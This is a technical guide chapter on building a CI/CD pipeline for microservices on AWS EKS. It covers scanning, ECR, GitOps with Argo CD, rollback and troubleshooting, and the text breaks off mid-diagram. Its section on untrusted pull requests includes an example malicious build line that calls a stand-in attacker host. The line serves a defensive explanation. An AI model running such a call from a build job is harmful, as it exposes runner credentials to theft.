# 36 — Complete CI/CD Pipeline

## 1. Purpose

This chapter defines a production-grade CI/CD implementation for the RoboShop-style microservices platform running on AWS EKS.

The design separates continuous integration, artifact management, GitOps configuration, deployment reconciliation, production verification, and rollback.

Core principle:

> CI builds and validates immutable artifacts. GitOps stores desired deployment state. Argo CD reconciles that desired state into EKS.

---

## 2. Production Architecture

```text
Developer
   |
   v
Application Git Repository
   |
   v
CI Trigger
   |
   +--> Checkout
   +--> Build
   +--> Unit Tests
   +--> Integration Tests
   +--> SonarQube
   +--> Veracode / SAST
   +--> Trivy filesystem scan
   +--> Docker build
   +--> Trivy image scan
   +--> SBOM / provenance
   +--> Push to ECR
   |
   v
GitOps Repository
   |
   +--> Update immutable image digest
   +--> Validation / PR
   |
   v
Argo CD
   |
   v
AWS EKS
   |
   +--> Deployments
   +--> Services
   +--> ALB Ingress
   +--> HPA
   +--> PDB
   |
   +--> Prometheus
   +--> Grafana
   +--> ELK
   |
   v
Production Verification
   |
   +--> Smoke tests
   +--> SLI/SLO checks
   +--> Alerts
   |
   v
Operations / On-call
```

---

## 3. CI/CD Responsibilities

### CI responsibilities

CI is responsible for producing a trustworthy artifact.

Typical responsibilities:

1. Checkout source.
2. Validate dependencies.
3. Compile/build.
4. Run unit tests.
5. Run integration tests.
6. Run code-quality analysis.
7. Run SAST/security analysis.
8. Scan source files and dependencies.
9. Build the container image.
10. Scan the image.
11. Generate SBOM/provenance when required.
12. Push the immutable artifact to ECR.
13. Update the GitOps deployment configuration.

### GitOps responsibilities

GitOps is responsible for desired deployment state.

It stores:

- application version
- image digest
- replica settings
- resources
- Helm values
- environment configuration
- ingress configuration
- deployment policy

### Argo CD responsibilities

Argo CD:

- watches Git
- compares desired and actual state
- detects drift
- synchronizes approved state
- reports health
- manages multiple EKS clusters
- provides deployment history

---

## 4. CI vs CD

A useful production distinction is:

```text
CI = Can we safely build this change?

CD = Can we safely deliver this already-built artifact?
```

CI should not rebuild an artifact for every environment.

The preferred model is:

```text
Commit
  |
  v
Build once
  |
  v
Image digest A
  |
  +--> Dev
  +--> QA
  +--> Production
```

This is safer than:

```text
Commit
  +--> build A -> Dev
  +--> build B -> QA
  +--> build C -> Production
```

Rebuilding can introduce differences in dependencies, base images, timestamps, or build tools.

---

## 5. Repository Strategy

A production organization can use separate repositories:

```text
platform/
|
+-- catalogue.git
+-- user.git
+-- cart.git
+-- payment.git
+-- shipping.git
+-- frontend.git
|
+-- gitops.git
|
+-- terraform.git
```

The application repository contains source code and application tests.

The GitOps repository contains deployment intent.

The Terraform repository contains infrastructure definitions.

This separation creates clearer ownership and audit trails.

---

## 6. Application Repository Example

```text
catalogue/
|
+-- src/
+-- tests/
+-- pom.xml
+-- Dockerfile
+-- .dockerignore
+-- Jenkinsfile
+-- .github/
|   +-- workflows/
+-- scripts/
|   +-- test.sh
|   +-- security-scan.sh
+-- README.md
```

For Node.js:

```text
package.json
package-lock.json
src/
tests/
Dockerfile
```

For Python:

```text
pyproject.toml
requirements.txt
src/
tests/
Dockerfile
```

---

## 7. GitOps Repository Example

```text
gitops/
|
+-- environments/
|   +-- dev/
|   |   +-- catalogue/
|   |       +-- values.yaml
|   +-- qa/
|   |   +-- catalogue/
|   |       +-- values.yaml
|   +-- prod/
|       +-- catalogue/
|           +-- values.yaml
|
+-- charts/
|   +-- roboshop-service/
|
+-- applications/
|   +-- dev/
|   +-- qa/
|   +-- prod/
|
+-- policies/
+-- README.md
```

---

## 8. Branching Strategy

A practical model is:

```text
feature/*
   |
   v
Pull Request
   |
   v
main
   |
   v
release/tag
```

Production branches should be protected.

Recommended controls:

- pull request required
- required CI checks
- CODEOWNERS
- minimum approvals
- no direct production pushes
- branch protection
- optional signed commits
- review for high-risk changes

---

## 9. Immutable Image Strategy

Avoid:

```text
catalogue:latest
```

Prefer:

```text
catalogue:8f3c1a2
```

or preferably an immutable digest:

```text
catalogue@sha256:0123456789abcdef...
```

The digest identifies the exact image content.

This is important for:

- rollback
- auditability
- incident investigation
- reproducibility
- supply-chain security

---

## 10. Versioning

A release may contain:

```text
Application version: 1.8.3
Git SHA: 8f3c1a2
Image digest: sha256:...
Build ID: 1842
GitOps commit: 4ab7e91
Argo CD sync: 9132
```

All of these identifiers should be traceable.

---

## 11. Pipeline Stages

A production pipeline can use:

```text
Checkout
   |
Dependency validation
   |
Compile
   |
Unit tests
   |
Integration tests
   |
SonarQube
   |
Veracode / SAST
   |
Trivy filesystem scan
   |
Docker build
   |
Trivy image scan
   |
SBOM
   |
Push ECR
   |
Update GitOps
   |
Argo CD deployment
   |
Smoke tests
   |
SLI verification
```

Every blocking stage must fail the pipeline when its policy is violated.

---

## 12. Checkout Stage

The pipeline should build the exact commit that triggered the workflow.

Example:

```bash
git rev-parse HEAD
git status --short
git log -1 --oneline
```

The build should not silently use an uncommitted workspace state.

Record the commit SHA as build metadata.

---

## 13. Dependency Management

Dependency management is part of software supply-chain security.

Production practices:

- commit lock files
- pin important versions
- use approved repositories
- scan dependencies
- review critical CVEs
- avoid arbitrary runtime downloads

Maven:

```bash
mvn -B dependency:go-offline
mvn -B dependency:tree
```

Node.js:

```bash
npm ci
npm audit --audit-level=high
```

Python:

```bash
python -m pip install -r requirements.txt
```

---

## 14. Maven Build

Example:

```bash
mvn -B clean package
```

A CI build should normally execute tests as part of the build or in a separate explicit stage.

Avoid silently skipping tests in the production release pipeline.

---

## 15. Node.js Build

Example:

```bash
npm ci
npm test
npm run build
```

Use `npm ci` for reproducible CI installation when a lock file exists.

---

## 16. Python Build

Example:

```bash
python -m venv .venv
. .venv/bin/activate
pip install -r requirements.txt
pytest
```

The CI image should provide a controlled Python version.

---

## 17. Unit Tests

Unit tests should run before expensive deployment stages.

Examples:

```bash
mvn -B test
```

```bash
npm test
```

```bash
pytest -q
```

If required tests fail:

```text
Test failure
    |
    X
Pipeline stops
    |
    X
No ECR push
    |
    X
No GitOps update
```

---

## 18. Integration Tests

Integration testing validates dependencies such as:

- database
- Redis
- message broker
- service-to-service APIs
- authentication
- external API contracts

CI should use isolated test dependencies.

Never point ordinary CI tests at production databases.

---

## 19. Contract Testing

Microservices can use API contract tests to detect incompatible changes.

Example:

```text
catalogue API
      |
      v
consumer contract
      |
      v
payment / frontend test
```

This is especially valuable when services are released independently.

---

## 20. SonarQube

SonarQube can detect:

- bugs
- vulnerabilities
- code smells
- duplication
- coverage problems
- maintainability issues

Example Maven invocation:

```bash
mvn sonar:sonar \
  -Dsonar.host.url="$SONAR_HOST_URL" \
  -Dsonar.token="$SONAR_TOKEN"
```

The token must come from CI secret management.

Never hard-code it in Git.

---

## 21. Quality Gate

The production flow should be:

```text
SonarQube
   |
   +--> PASS --> continue
   |
   +--> FAIL --> stop
```

A quality gate can enforce organizational thresholds for:

- new vulnerabilities
- bugs
- coverage
- duplication
- maintainability

Do not make a quality gate informational if policy requires it to block releases.

---

## 22. Veracode / SAST

A SAST stage analyzes application code for security weaknesses.

Typical flow:

```text
Build artifact
   |
   v
Security analysis
   |
   v
Policy evaluation
   |
   +--> PASS
   |
   +--> FAIL
```

A production implementation should define:

- severity thresholds
- policy rules
- exceptions
- owners
- expiration dates
- evidence requirements

---

## 23. Trivy Filesystem Scan

Example:

```bash
trivy fs \
  --severity HIGH,CRITICAL \
  --exit-code 1 \
  .
```

This can detect vulnerabilities in dependencies and configuration.

The exact policy depends on the organization's risk model.

---

## 24. Dockerfile Production Principles

Use:

- minimal runtime images
- multi-stage builds
- pinned major versions
- non-root users
- no embedded credentials
- deterministic dependencies
- health endpoints where appropriate

Avoid:

```dockerfile
USER root
```

when the application does not require root.

---

## 25. Multi-stage Docker Build

Example:

```dockerfile
FROM maven:3.9-eclipse-temurin-21 AS build

WORKDIR /src
COPY pom.xml .
COPY src ./src
RUN mvn -B clean package -DskipTests

FROM eclipse-temurin:21-jre

RUN useradd --system --uid 10001 appuser
WORKDIR /app
COPY --from=build /src/target/app.jar /app/app.jar
USER 10001
ENTRYPOINT ["java", "-jar", "/app/app.jar"]
```

The final image does not contain Maven or source build tooling.

---

## 26. Docker Build

Example:

```bash
docker build \
  --pull \
  --tag "$ECR_REPOSITORY:$IMAGE_TAG" \
  .
```

The pipeline should record:

```bash
docker image inspect "$ECR_REPOSITORY:$IMAGE_TAG"
```

---

## 27. Image Tagging

A practical tag is:

```text
<service>:<git-short-sha>
```

Example:

```text
catalogue:8f3c1a2
```

A human-readable release tag can coexist:

```text
catalogue:1.8.3-8f3c1a2
```

The deployment should still resolve to immutable content.

---

## 28. ECR Authentication

Use AWS identity federation or a workload role where possible.

Example:

```bash
aws sts get-caller-identity

aws ecr get-login-password \
  --region ap-south-1 |
docker login \
  --username AWS \
  --password-stdin \
  123456789012.dkr.ecr.ap-south-1.amazonaws.com
```

The CI identity should have only the ECR permissions it needs.

---

## 29. ECR Push

Example:

```bash
docker tag \
  catalogue:$IMAGE_TAG \
  123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue:$IMAGE_TAG

docker push \
  123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue:$IMAGE_TAG
```

Verify:

```bash
aws ecr describe-images \
  --repository-name catalogue \
  --image-ids imageTag="$IMAGE_TAG" \
  --region ap-south-1
```

---

## 30. Image Scanning

Example:

```bash
trivy image \
  --severity HIGH,CRITICAL \
  --exit-code 1 \
  123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue:$IMAGE_TAG
```

Production policy should define:

- blocking severity
- exploitability considerations
- ignored CVEs
- exception owner
- expiration date
- compensating controls

---

## 31. SBOM

Generate an SBOM where required:

```bash
trivy image \
  --format cyclonedx \
  --output sbom.json \
  "$IMAGE_REFERENCE"
```

An SBOM supports:

- vulnerability response
- compliance
- dependency inventory
- incident investigation
- supply-chain visibility

---

## 32. Image Signing

A mature pipeline can sign images and attach provenance.

Conceptual model:

```text
Build
  |
  v
Image
  |
  v
Sign / Attest
  |
  v
ECR
  |
  v
Admission / Verification
  |
  v
EKS
```

Signing keys or signing identities must not be committed to source control.

---

## 33. GitOps Update

After ECR push, CI updates deployment configuration.

Example:

```yaml
image:
  repository: 123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue
  digest: "sha256:REPLACE_ME"
```

The deployment reference should identify the exact artifact.

---

## 34. Why GitOps Instead of Direct kubectl

Less desirable:

```text
CI
 |
 +--> kubectl apply
 |
 v
EKS
```

Problems:

- deployment state may exist outside Git
- CI needs cluster credentials
- auditability is weaker
- drift handling is less consistent
- rollback history can be fragmented

Preferred:

```text
CI -> ECR -> GitOps -> Argo CD -> EKS
```

---

## 35. GitOps Pull Request

Production:

```text
CI
 |
 v
Create Git branch
 |
 v
Update image digest
 |
 v
Pull Request
 |
 +--> Helm lint
 +--> YAML validation
 +--> Security policy
 +--> Review
 |
 v
Merge
 |
 v
Argo CD
```

This provides an auditable production change.

---

## 36. Helm Validation

Example:

```bash
helm lint ./charts/roboshop-service
```

Render:

```bash
helm template catalogue \
  ./charts/roboshop-service \
  -f environments/prod/catalogue/values.yaml
```

Server-side validation can be performed in a controlled environment:

```bash
helm template catalogue ./charts/roboshop-service \
  -f environments/prod/catalogue/values.yaml |
kubectl apply --dry-run=server -f -
```

---

## 37. Policy Validation

Production policies can enforce:

```text
No latest tag
No privileged container
Requests required
Limits required
RunAsNonRoot required
Required probes
Approved registry
Required labels
No hostPath unless approved
No hostNetwork unless approved
```

Use the organization's approved policy engine and do not bypass policy in CI.

---

## 38. Argo CD Application

Example:

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: catalogue-prod
  namespace: argocd
spec:
  project: production

  source:
    repoURL: https://git.example.com/platform/gitops.git
    targetRevision: main
    path: environments/prod/catalogue

  destination:
    server: https://kubernetes.default.svc
    namespace: roboshop

  syncPolicy:
    automated:
      prune: true
      selfHeal: true
    syncOptions:
      - CreateNamespace=true
      - PrunePropagationPolicy=foreground
```

Production automation policy should reflect application risk and change-control requirements.

---

## 39. Argo CD Sync

```text
Git change
   |
   v
Argo CD detects change
   |
   v
Desired vs actual comparison
   |
   +--> Synced
   |
   +--> OutOfSync
           |
           v
         Sync
           |
           v
         EKS
```

Argo CD should remain the reconciliation authority.

---

## 40. Synced Does Not Mean Healthy

A critical production distinction:

```text
Synced = desired state matches Git
Healthy = workload is operating correctly
```

An application can be:

```text
Synced + Degraded
```

For example, Kubernetes may accept a Deployment while pods fail their readiness probes.

Always inspect both synchronization and health.

---

## 41. Kubernetes Deployment

Example production-style manifest:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: catalogue
  namespace: roboshop
  labels:
    app: catalogue
    app.kubernetes.io/name: catalogue
    app.kubernetes.io/part-of: roboshop
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 0
      maxSurge: 1
  selector:
    matchLabels:
      app: catalogue
  template:
    metadata:
      labels:
        app: catalogue
        app.kubernetes.io/name: catalogue
    spec:
      serviceAccountName: catalogue
      terminationGracePeriodSeconds: 60
      containers:
        - name: catalogue
          image: 123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue@sha256:REPLACE_ME
          ports:
            - name: http
              containerPort: 8080
          resources:
            requests:
              cpu: 250m
              memory: 256Mi
            limits:
              cpu: "1"
              memory: 512Mi
          readinessProbe:
            httpGet:
              path: /health
              port: http
            initialDelaySeconds: 10
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3
          livenessProbe:
            httpGet:
              path: /health
              port: http
            initialDelaySeconds: 30
            periodSeconds: 20
            timeoutSeconds: 3
            failureThreshold: 3
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            capabilities:
              drop:
                - ALL
```

---

## 42. Rolling Deployment

Using:

```yaml
maxUnavailable: 0
maxSurge: 1
```

attempts to preserve available capacity while adding replacement pods.

Actual safety depends on:

- readiness probes
- startup time
- capacity
- PDB
- HPA
- application shutdown behavior
- node availability

---

## 43. Readiness Probes

Readiness answers:

> Should this pod receive traffic?

A failed readiness probe removes the pod from service endpoints.

This is essential during rolling deployments.

---

## 44. Liveness Probes

Liveness answers:

> Is the process sufficiently healthy to remain running?

A bad liveness probe can cause unnecessary restarts.

Do not use liveness as a simple replacement for readiness.

---

## 45. Startup Probes

For slow-starting applications, use a startup probe so liveness does not restart the container before initialization completes.

Example:

```yaml
startupProbe:
  httpGet:
    path: /health
    port: http
  failureThreshold: 30
  periodSeconds: 10
```

The correct thresholds depend on actual application startup behavior.

---

## 46. Graceful Shutdown

A production application should handle SIGTERM:

```text
SIGTERM
  |
  v
Stop accepting new requests
  |
  v
Finish in-flight requests
  |
  v
Flush important state
  |
  v
Exit
```

Example:

```yaml
terminationGracePeriodSeconds: 60
```

The value must match application behavior.

---

## 47. Post-deployment Verification

Rollout status:

```bash
kubectl rollout status \
  deployment/catalogue \
  -n roboshop \
  --timeout=5m
```

Pods:

```bash
kubectl get pods -n roboshop -l app=catalogue
```

Endpoints:

```bash
kubectl get endpointslice \
  -n roboshop \
  -l kubernetes.io/service-name=catalogue
```

---

## 48. Smoke Tests

Example:

```bash
curl -fsS \
  --max-time 10 \
  https://shop.example.com/api/health
```

A smoke test should verify a meaningful user-facing path rather than only whether a process is listening.

For authenticated systems, use dedicated test identities and never expose production credentials in pipeline output.

---

## 49. SLI Verification

A release can roll out successfully while causing user impact.

Evaluate:

- availability
- error rate
- latency
- saturation
- restart rate
- dependency health

Example error-rate PromQL:

```promql
sum(rate(http_requests_total{service="catalogue",status=~"5.."}[5m]))
/
sum(rate(http_requests_total{service="catalogue"}[5m]))
```

---

## 50. Release Guardrail

```text
Deploy
 |
 v
Rollout status
 |
 +--> FAIL --> stop
 |
 +--> PASS
       |
       v
Smoke test
 |
 +--> FAIL --> rollback/investigate
 |
 +--> PASS
       |
       v
SLI verification
 |
 +--> Regression --> rollback/investigate
 |
 +--> Healthy --> release accepted
```

---

## 51. Production Approval

For high-risk releases:

```text
CI
 |
 v
Artifact
 |
 v
GitOps PR
 |
 v
Automated validation
 |
 v
Human approval
 |
 v
Merge
 |
 v
Argo CD
```

Approval should be risk-based rather than bureaucratic.

---

## 52. Environment Promotion

A practical model:

```text
Build
 |
 v
Dev
 |
 v
Automated validation
 |
 v
QA
 |
 v
Acceptance
 |
 v
Production
```

The same immutable artifact should move through environments.

---

## 53. Environment Values

Example:

```yaml
replicaCount: 3

image:
  repository: 123456789012.dkr.ecr.ap-south-1.amazonaws.com/catalogue
  digest: sha256:REPLACE_ME

resources:
  requests:
    cpu: 250m
    memory: 256Mi
  limits:
    cpu: "1"
    memory: 512Mi
```

Dev may use fewer replicas and smaller resources.

Production values should be independently reviewed.

---

## 54. Secret Handling

Do not put credentials in:

```text
Dockerfile
Jenkinsfile
GitHub workflow
values.yaml
source code
```

Use the approved secrets-management architecture.

The pipeline should reference secret identifiers rather than printing secret values.

---

## 55. Jenkins Production Pipeline

Example:

```groovy
pipeline {
    agent any

    environment {
        AWS_REGION = 'ap-south-1'
        ECR_REPOSITORY = 'catalogue'
        IMAGE_TAG = "${env.GIT_COMMIT.take(7)}"
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
            }
        }

        stage('Unit Test') {
            steps {
                sh 'mvn -B clean test'
            }
        }

        stage('SonarQube') {
            steps {
                withCredentials([
                    string(credentialsId: 'sonarqube-token', variable: 'SONAR_TOKEN'),
                    string(credentialsId: 'sonarqube-url', variable: 'SONAR_HOST_URL')
                ]) {
                    sh '''
                        mvn sonar:sonar \\
                          -Dsonar.host.url="$SONAR_HOST_URL" \\
                          -Dsonar.token="$SONAR_TOKEN"
                    '''
                }
            }
        }

        stage('Filesystem Scan') {
            steps {
                sh '''
                    trivy fs \\
                      --severity HIGH,CRITICAL \\
                      --exit-code 1 \\
                      .
                '''
            }
        }

        stage('Build Image') {
            steps {
                sh 'docker build --pull -t "$ECR_REPOSITORY:$IMAGE_TAG" .'
            }
        }

        stage('Image Scan') {
            steps {
                sh '''
                    trivy image \\
                      --severity HIGH,CRITICAL \\
                      --exit-code 1 \\
                      "$ECR_REPOSITORY:$IMAGE_TAG"
                '''
            }
        }

        stage('Push ECR') {
            steps {
                sh './scripts/push-ecr.sh "$IMAGE_TAG"'
            }
        }

        stage('Update GitOps') {
            steps {
                sh './scripts/update-gitops.sh "$IMAGE_TAG"'
            }
        }
    }

    post {
        failure {
            echo 'Pipeline failed'
        }
        success {
            echo 'Pipeline completed'
        }
    }
}
```

Credentials are placeholders and must be provided through Jenkins credential management or workload identity.

---

## 56. Jenkins Credentials

Never write:

```groovy
AWS_SECRET_ACCESS_KEY = 'real-secret'
```

Use:

```groovy
withCredentials(...)
```

Better still, use short-lived cloud federation where supported.

Protect:

- AWS access
- Git credentials
- SonarQube tokens
- Veracode credentials
- registry credentials
- notification credentials

---

## 57. GitHub Actions

Example:

```yaml
name: Catalogue CI

on:
  pull_request:
  push:
    branches:
      - main

permissions:
  contents: read
  id-token: write

env:
  AWS_REGION: ap-south-1
  ECR_REPOSITORY: catalogue

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'
          cache: maven

      - name: Test
        run: mvn -B clean test

      - name: Filesystem scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: fs
          severity: HIGH,CRITICAL
          exit-code: '1'

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: ${{ env.AWS_REGION }}

      - name: ECR login
        uses: aws-actions/amazon-ecr-login@v2

      - name: Build
        run: |
          docker build \\
            --pull \\
            -t "${ECR_REPOSITORY}:${GITHUB_SHA::7}" .

      - name: Push
        run: |
          docker tag \\
            "${ECR_REPOSITORY}:${GITHUB_SHA::7}" \\
            "${{ secrets.ECR_REGISTRY }}/${ECR_REPOSITORY}:${GITHUB_SHA::7}"

          docker push \\
            "${{ secrets.ECR_REGISTRY }}/${ECR_REPOSITORY}:${GITHUB_SHA::7}"
```

Action versions should be pinned and managed according to organizational policy.

---

## 58. GitHub OIDC

Avoid static AWS keys where possible.

```text
GitHub Actions
      |
      | OIDC token
      v
AWS STS
      |
      v
IAM Role
      |
      v
ECR
```

The trust policy should restrict:

- organization
- repository
- branch or environment
- workload identity claims

---

## 59. CI Runner Security

CI runners are part of the production security boundary.

Protect:

- runner host
- workspace
- credentials
- logs
- artifact cache
- Docker daemon
- network access

Use isolated or ephemeral runners where practical.

---

## 60. Untrusted Pull Requests

A pull request can contain malicious build code such as:

```bash
curl attacker.example
```

If the runner exposes production credentials, the pull request could attempt credential abuse.

Therefore:

- do not expose production secrets to untrusted PRs
- isolate PR runners
- use least privilege
- separate PR and release identities
- restrict fork workflows

---

## 61. Docker Build Security

Docker socket exposure can be dangerous.

Avoid unnecessarily giving build jobs unrestricted access to the host Docker daemon.

Possible approaches include:

- BuildKit
- rootless builders
- isolated build runners
- managed build services
- approved image-build systems

Choose according to the organization's security model.

---

## 62. GitOps Update Script

Example:

```bash
#!/usr/bin/env bash
set -euo pipefail

IMAGE_DIGEST="${1:?image digest required}"

export IMAGE_DIGEST

yq -i \
  '.image.digest = strenv(IMAGE_DIGEST)' \
  environments/dev/catalogue/values.yaml

git diff --check
git diff
```

Production should generally create a PR instead of directly pushing to the protected production branch.

---

## 63. GitOps Pull Request Automation

Validation should include:

```text
Helm lint
   |
YAML parse
   |
Schema validation
   |
Policy checks
   |
Security checks
   |
Diff review
```

The deployment PR should clearly show what image is being promoted.

---

## 64. Deployment Metadata

Useful annotations:

```yaml
metadata:
  annotations:
    app.example.com/git-sha: "8f3c1a2"
    app.example.com/build-id: "jenkins-1842"
    app.example.com/image-digest: "sha256:REPLACE_ME"
```

This helps operators correlate Kubernetes state with CI history.

---

## 65. Argo CD CLI Checks

Example:

```bash
argocd app get catalogue-prod
```

Check sync:

```bash
argocd app wait catalogue-prod \
  --sync \
  --health
```

Use the appropriate Argo CD authentication and RBAC controls.

---

## 66. Argo CD Health Investigation

If the application is degraded:

```bash
kubectl get application catalogue-prod -n argocd -o yaml
```

Then inspect:

```bash
kubectl get events \
  -n roboshop \
  --sort-by=.lastTimestamp
```

Check:

- Deployment
- ReplicaSet
- pods
- Service
- EndpointSlices
- Ingress
- ConfigMaps
- Secrets references

---

## 67. Deployment Failure — CrashLoopBackOff

Symptoms:

```text
Pod repeatedly restarts
```

Investigation:

```bash
kubectl get pods -n roboshop
kubectl describe pod <pod> -n roboshop
kubectl logs <pod> -n roboshop
kubectl logs <pod> -n roboshop --previous
```

Possible causes:

- bad configuration
- missing secret
- incompatible dependency
- startup failure
- OOMKilled
- incorrect command
- permission failure

---

## 68. Deployment Failure — ImagePullBackOff

Check:

```bash
kubectl describe pod <pod> -n roboshop
```

Common causes:

- wrong repository
- wrong tag
- wrong digest
- ECR authorization failure
- network problem
- image deleted
- architecture mismatch

Verify the image exists:

```bash
aws ecr describe-images \
  --repository-name catalogue \
  --image-ids imageTag="$IMAGE_TAG" \
  --region ap-south-1
```

---

## 69. Deployment Failure — Readiness

If pods are running but not ready:

```bash
kubectl describe pod <pod> -n roboshop
```

Check:

- probe path
- probe port
- application startup
- dependency availability
- service configuration
- network policy

Do not immediately disable readiness checks just to make the rollout green.

---

## 70. Deployment Failure — ALB

If pods are healthy but users receive errors:

Check:

```bash
kubectl get ingress -n roboshop
kubectl describe ingress <ingress> -n roboshop
kubectl get endpointslice -n roboshop
```

Also inspect ALB target health.

Possible causes:

- incorrect target port
- health check path mismatch
- security group rules
- subnet/tag configuration
- listener rule issue
- service selector mismatch

---

## 71. Deployment Failure — Database Compatibility

A release may deploy successfully and then fail because the application expects a database schema that is not available.

Production practice:

```text
Application release
        |
        v
Backward-compatible migration
        |
        v
Application rollout
        |
        v
Cleanup migration later
```

Avoid destructive database migrations that make rollback impossible unless explicitly planned.

---

## 72. Post-deployment Error-rate Check

Example:

```promql
sum(rate(http_requests_total{service="catalogue",status=~"5.."}[5m]))
/
sum(rate(http_requests_total{service="catalogue"}[5m]))
```

If the error rate jumps immediately after a release:

```text
Release
  |
  v
Error rate increases
  |
  v
Correlate timestamp
  |
  v
Inspect application logs
  |
  v
Compare previous image
  |
  v
Rollback if release is causal
```

---

## 73. Latency Check

A release can preserve availability while degrading latency.

Example histogram query:

```promql
histogram_quantile(
  0.95,
  sum by (le) (
    rate(http_request_duration_seconds_bucket{service="catalogue"}[5m])
  )
)
```

Compare against the service's SLO target and baseline.

---

## 74. Deployment Rollback

GitOps rollback:

```bash
git revert <gitops-commit>
git push
```

Argo CD reconciles the previous desired state.

Emergency Kubernetes rollback:

```bash
kubectl rollout undo \
  deployment/catalogue \
  -n roboshop
```

If Argo CD owns the deployment, reconcile the Git state afterward.

---

## 75. Why Git Revert Is the Durable Rollback

Manual Kubernetes rollback changes cluster state.

Git revert changes desired state.

The durable production model is:

```text
Incident
 |
 v
Mitigation
 |
 v
GitOps revert
 |
 v
Argo CD
 |
 v
EKS
```

This prevents Git from remaining inconsistent with the cluster.

---

## 76. Emergency Deployment Pause

If a rollout is actively causing impact:

```bash
kubectl rollout pause \
  deployment/catalogue \
  -n roboshop
```

Use emergency commands carefully because GitOps reconciliation can override manual state.

The long-term desired state must still be corrected in Git.

---

## 77. Release Notifications

Useful notifications include:

- production deployment started
- deployment completed
- deployment failed
- rollback executed
- Argo CD degraded
- SLO breach
- security policy failure

Do not send every low-value event to every engineer.

Route by team and severity.

---

## 78. Example Deployment Notification

```text
Production Deployment

Service: catalogue
Environment: prod
Version: 1.8.3
Git SHA: 8f3c1a2
Image Digest: sha256:...
Cluster: roboshop-prod
Namespace: roboshop

Argo CD: Synced / Healthy
Rollout: PASS
Smoke Test: PASS
Error Rate: 0.18%
Latency p95: 210ms

Status: SUCCESS
```

---

## 79. DORA Metrics

Track:

1. Deployment Frequency
2. Lead Time for Changes
3. Change Failure Rate
4. Time to Restore Service

These should be interpreted together.

Example:

```text
Deployment frequency increases
but
change failure rate doubles
```

This is not healthy improvement.

---

## 80. Pipeline Reliability Metrics

Track:

- CI success rate
- median build duration
- queue time
- flaky-test rate
- deployment duration
- rollback rate
- security-failure rate
- GitOps sync failure rate
- smoke-test failure rate

Use these metrics to improve the delivery system itself.

---

## 81. Artifact Retention

Retain sufficient history for:

- rollback
- incident investigation
- compliance
- security analysis

ECR lifecycle policies can remove stale images while retaining production rollback candidates.

Do not keep unlimited CI images forever.

---

## 82. ECR Lifecycle Strategy

Example policy concept:

```text
Production releases:
  retain required rollback window

Non-production images:
  retain recent N images

Ephemeral branches:
  expire aggressively
```

The exact retention period should match recovery requirements.

---

## 83. Build Cache

Caches can speed builds:

Maven:

```text
~/.m2/repository
```

Node:

```text
~/.npm
```

But caches must not be trusted blindly.

Use lock files and controlled dependencies.

---

## 84. CI Network Security

The runner should not have unrestricted access to every production subnet.

Prefer:

```text
CI
 |
 +--> ECR endpoint
 +--> Git provider
 +--> approved security services
```

Production cluster access should normally be unnecessary for ordinary CI.

Argo CD handles deployment reconciliation.

---

## 85. Separation of Duties

A strong production model separates:

```text
Developer
   |
   v
Application code

CI
   |
   v
Artifact

Reviewer / GitOps
   |
   v
Deployment intent

Argo CD
   |
   v
Cluster
```

This reduces the blast radius of a compromised developer account or CI job.

---

## 86. Production Pipeline YAML Policy

A pipeline definition should itself be reviewed.

Changes to:

- deployment permissions
- cloud roles
- scanners
- production branches
- release gates
- secret access

should receive stronger review than ordinary application changes.

---

## 87. Failed Build Example

Symptom:

```text
mvn clean package
ERROR: compilation failure
```

Investigation:

```bash
git log -1 --oneline
mvn -B clean test
```

Root cause may be:

- incompatible API
- dependency update
- Java version mismatch
- compile error

Fix the source or dependency definition.

No image should be published.

---

## 88. Failed Security Scan Example

Symptom:

```text
Trivy: CRITICAL vulnerability
```

Investigation:

```bash
trivy image --severity CRITICAL "$IMAGE_REFERENCE"
```

Determine:

- package
- installed version
- fixed version
- exploitability
- exception requirement

Preferred fix:

```text
Upgrade dependency/base image
```

Do not simply suppress the finding without risk analysis.

---

## 89. Failed ECR Push Example

Check identity:

```bash
aws sts get-caller-identity
```

Check repository:

```bash
aws ecr describe-repositories \
  --repository-names catalogue \
  --region ap-south-1
```

Common root causes:

- wrong role
- missing ECR permission
- wrong region
- repository missing
- authentication failure
- network issue

---

## 90. Failed GitOps Update Example

Symptoms:

```text
ECR push succeeded
GitOps update failed
```

The artifact remains available.

Check:

```bash
git status
git remote -v
git branch --show-current
git diff --check
```

Common causes:

- protected branch
- authentication failure
- merge conflict
- malformed YAML
- incorrect path
- Git service outage

Do not rebuild the image unnecessarily.

---

## 91. Argo CD Sync Failure Example

Check:

```bash
argocd app get catalogue-prod
```

Then:

```bash
kubectl get events \
  -n roboshop \
  --sort-by=.lastTimestamp
```

Inspect the failing resource.

Typical causes:

- invalid manifest
- missing namespace
- admission policy rejection
- quota exceeded
- insufficient node capacity
- invalid image
- dependency/configuration problem

---

## 92. Production Release Checklist

```text
[ ] Correct Git commit
[ ] Dependencies validated
[ ] Unit tests passed
[ ] Integration tests passed
[ ] Quality gate passed
[ ] SAST passed
[ ] Trivy filesystem scan passed
[ ] Image built
[ ] Image scan passed
[ ] SBOM/provenance generated if required
[ ] Image pushed to ECR
[ ] Immutable digest recorded
[ ] GitOps PR created
[ ] Helm lint passed
[ ] Manifest validation passed
[ ] Policy validation passed
[ ] Review completed
[ ] Production approval completed if required
[ ] Argo CD synchronized
[ ] Application healthy
[ ] Rollout completed
[ ] Smoke test passed
[ ] SLI checks passed
[ ] Release communicated
```

---

## 93. Complete Pipeline Flow

```text
Developer
   |
   v
Pull Request
   |
   +--> Build
   +--> Unit Test
   +--> Integration Test
